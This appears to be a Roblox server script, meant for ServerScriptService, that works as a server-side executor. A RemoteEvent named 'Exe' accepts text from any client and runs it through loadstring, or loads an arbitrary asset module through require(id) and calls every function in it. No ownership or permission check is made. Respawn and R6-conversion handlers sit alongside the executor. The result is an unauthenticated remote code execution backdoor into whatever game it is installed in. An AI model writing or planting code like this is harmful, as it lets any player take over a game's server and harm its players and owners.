--[[
       Place this script in ServerScriptService
]]

-- [[ SERVICES ]] --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Remote = ReplicatedStorage:FindFirstChild("Exe")


-- [[ DATA ]] --
local AutoR6_List = {}


-- [[ FUNCTIONS ]] --
-- Send a notification to the client
local function NotifyClient(player, titleKey, msgKey, extraData)
    Remote:FireClient(player, "Notify", {
        Title = titleKey,
        Msg = msgKey,
        Extra = extraData
    })
end

-- Convert the player's character to R6 rig
local function ConvertToR6(player)
    local char = player.Character
    if not char or not char:FindFirstChild("Humanoid") then return end

    if char.Humanoid.RigType ~= Enum.HumanoidRigType.R6 then
        local desc = Players:GetHumanoidDescriptionFromUserId(player.UserId)
        local newAvatar = Players:CreateHumanoidModelFromDescription(
            desc,
            Enum.HumanoidRigType.R6
        )

        -- Keep the old character position
        if char.PrimaryPart then
            newAvatar:SetPrimaryPartCFrame(char.PrimaryPart.CFrame)
        end

        newAvatar.Name = player.Name

        -- Move tools and non-Animate scripts to the new character
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("Tool") or (v:IsA("LuaSourceContainer") and v.Name ~= "Animate") then
                v.Parent = newAvatar
            end
        end

        player.Character = newAvatar
        newAvatar.Parent = workspace
    end
end

-- [[ EVENTS ]] --
-- Handle new players
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char)
        -- Auto-convert to R6 if enabled for this player
        if AutoR6_List[player.UserId] then
            task.wait(1)
            ConvertToR6(player)
        end
    end)
end)

-- Handle remote events from clients
Remote.OnServerEvent:Connect(function(player, action, data)
    if action == "Execute" then

        -- [METHOD 1] LOADSTRING (MOST POWERFUL – IF THE SERVER ALLOWS IT)
        local ranLoadstring = false
        pcall(function()
            local func = loadstring(data)
            if func then
                func()
                ranLoadstring = true
                NotifyClient(player, "TIT_SUCCESS", "MSG_SUCCESS", "Loadstring Mode")
            end
        end)
        if ranLoadstring then return end

        -- [METHOD 2] MANUAL PARSING (SUPPORTS MORE THAN 20 PARAMETERS)

        -- 1. Get the script/module ID
        local idStr =
            string.match(data, "require%((%d+)%)") or
            string.match(data, "require%((0x%x+)%)")

        if not idStr then
            NotifyClient(player, "TIT_ERR", "MSG_NO_ID")
            return
        end

        local id = tonumber(idStr)
        NotifyClient(player, "TIT_LOADING", "MSG_LOADING", tostring(id))

        -- 2. Require the module
        local success, module = pcall(function()
            return require(id)
        end)

        if not success then
            NotifyClient(player, "TIT_FAIL", "MSG_FAIL")
            return
        end

        -- 3. Handle arguments (IMPORTANT)
        local args = {}

        -- This pattern scans all strings enclosed in double quotes "" or single quotes ''
        -- It continues until the end of the string → supports unlimited parameters
        for arg in string.gmatch(data, "[\"'](.-)[\"']") do
            table.insert(args, arg)
        end

        -- Fallback:
        -- If no arguments are found, automatically use the player name
        if #args == 0 then
            -- Handle the case where the user inputs numbers or variables without quotes:
            -- example: require(id)(123)
            local plainArg = string.match(data, "%)%((.+)%)")
            if plainArg then
                -- If there are commas, split into multiple arguments
                for splitArg in string.gmatch(plainArg, "([^,]+)") do
                    -- Remove extra whitespace
                    table.insert(
                        args,
                        splitArg:gsub("^%s*", ""):gsub("%s*$", "")
                    )
                end
            else
                table.insert(args, player.Name)
            end
        end

        local runCount = 0

        -- 4. Run the module using unpack (expand all parameters)
        -- table.unpack(args) converts { "A", "B", "C" } into "A", "B", "C"
        if type(module) == "function" then
            pcall(function()
                module(table.unpack(args))
            end)
            runCount = runCount + 1
        end

        if type(module) == "table" then
            local mt = getmetatable(module)

            -- If the table is callable via __call
            if mt and mt.__call then
                pcall(function()
                    module(table.unpack(args))
                end)
                runCount = runCount + 1
            end

            -- Run all functions inside the table
            for _, func in pairs(module) do
                if type(func) == "function" then
                    pcall(function()
                        func(table.unpack(args))
                    end)
                    runCount = runCount + 1
                end
            end
        end

        -- Send result notification
        if runCount > 0 then
            NotifyClient(
                player,
                "SUCCESS",
                "",
                "Funcs: " .. runCount .. " | Args: " .. #args
            )
        else
            NotifyClient(player, "WARNING", "MSG_NO_FUNC")
        end

    elseif action == "Respawn" then
        -- Respawn the player and keep their old position
        local oldPos = player.Character and player.Character:GetPivot()
        player:LoadCharacter()

        if oldPos then
            local newChar = player.Character or player.CharacterAdded:Wait()
            task.wait(0.1)
            newChar:PivotTo(oldPos)
        end

    elseif action == "ToggleR6" then
        -- Enable or disable automatic R6 conversion
        if data then
            AutoR6_List[player.UserId] = true
            ConvertToR6(player)
            NotifyClient(player, "TIT_SYS", "MSG_R6_ON")
        else
            AutoR6_List[player.UserId] = nil
            NotifyClient(player, "TIT_SYS", "MSG_R6_OFF")
        end
    end
end)
